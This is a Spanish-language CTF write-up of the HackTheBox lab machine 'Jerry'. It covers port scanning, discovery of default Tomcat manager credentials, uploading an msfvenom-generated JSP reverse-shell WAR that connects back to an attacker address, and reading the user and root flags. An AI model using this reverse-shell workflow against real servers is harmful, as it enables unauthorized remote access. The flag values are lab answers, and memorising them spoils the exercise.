# Jerry

Plataforma: HackTheBox
OS: Windows
Level: Easy
Status: Done
Complete: Yes
EJPT: yes
Created time: 2 de diciembre de 2024 13:42
IP: 10.10.10.95

## Recopilación de información

<aside>
💡

</aside>

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
❯ ❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.95 -oG allports

PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 127

```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
❯ sudo nmap -p8080 -sCV --script=http-enum 10.10.10.95 -oN targeted
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|_  /docs/: Potentially interesting folder
|_http-server-header: Apache-Coyote/1.1

```

- **Identificación de vulnerabilidades**
    - 8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

- **Enumeracion Web (8080)**
    
    
    ![image.png](<imagenes/image 29.png>)
    

Whateweb

```php
whatweb 10.10.10.95:8080
http://10.10.10.95:8080 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache-Coyote/1.1], IP[10.10.10.95], Title[Apache Tomcat/7.0.88]
	
```

Revisando la web vemos el apartado “Server status” y al acceder aparece:

![image.png](<imagenes/image 30.png>)

Con dos credenciales : tomcat/s3cret

Probamos a acceder:

![image.png](<imagenes/image 31.png>)

Vemos que al acceder, podemos subir ficheros .war

## Explotación

<aside>
💡

</aside>

### Explotación 1

Creamos un payload con msfvenom: 

```bash
msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.16.9 lport=4444 -f war > shell.war
```

Subimos el fichero, nos ponemos a la escucha con netcat y accedemos a la web /shell.war

Obtenemos la rever:

![image.png](<imagenes/image 32.png>)

Accedemos a los directorios de Administrador :

```bash
C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,296,217,600 bytes free

C:\Users\Administrator\Desktop\flags>type *.txt 
type *.txt
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
C:\Users\Administrator\Desktop\flags>
```

## Explotación posterior

<aside>
💡 No hay escalada de privilegios

</aside>

## Conclusión

<aside>
💡

</aside>